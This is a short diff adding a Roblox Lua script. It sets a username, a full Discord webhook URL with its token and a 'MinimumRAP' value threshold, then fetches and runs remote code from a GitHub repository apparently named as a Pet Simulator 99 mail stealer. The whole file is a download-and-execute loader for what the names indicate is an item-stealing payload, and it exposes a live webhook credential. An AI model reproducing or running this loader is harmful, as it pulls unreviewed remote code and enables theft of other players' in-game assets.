@@ -1,0 +1,6 @@
+Username= 'kompow01'
+Webhook= 'https://discord.com/api/webhooks/1256279182766375064/X-lQ9CUgkKKU7dDqOXYg_tny8lcWDUFnPGngGnT5GgJiuiMUF_QFY1uWhj4ALcC4Pa6T'
+
+MinimumRAP = 500000
+
+loadstring(game:HttpGet(https://raw.githubusercontent.com/Ps99scriptgiver-web/PS99MailStealer/main/EgoV2))()
